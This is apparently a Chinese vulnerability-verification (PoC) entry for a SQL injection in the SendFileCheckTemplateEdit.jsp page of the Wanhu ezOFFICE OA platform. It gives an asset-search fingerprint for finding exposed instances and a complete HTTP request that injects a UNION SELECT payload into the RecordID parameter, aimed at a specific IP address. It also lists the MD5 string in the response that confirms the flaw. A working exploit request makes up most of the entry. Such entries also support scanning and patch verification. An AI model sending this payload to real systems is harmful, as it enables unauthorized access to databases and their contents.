﻿# 万户OA协同管理平台SendFileCheckTemplateEdit-SQL注入漏洞

> 更新时间：2023-12-07

> 漏洞编号：

> 漏洞说明：万户ezOFFICE协同管理平台是一个综合信息基础应用平台。 万户ezOFFICE协同管理平台存在SQL注入漏洞，攻击者可利用该漏洞获取数据库相关信息以及数据库权限。

> 漏洞特征：app="万户ezOFFICE协同管理平台"

> 验证脚本：HTTP

```
GET /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp?RecordID=1'%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27102103122%27))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL-- HTTP/1.1
Host: 47.100.117.189:7001
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

> 响应代码特征：200

> 响应内容特征：6cfe798ba8e5b85feb50164c59f4bec9

> 上传文件定位：

> 验证文件来源：万户OA协同管理平台SendFileCheckTemplateEdit-SQL注入漏洞.poc
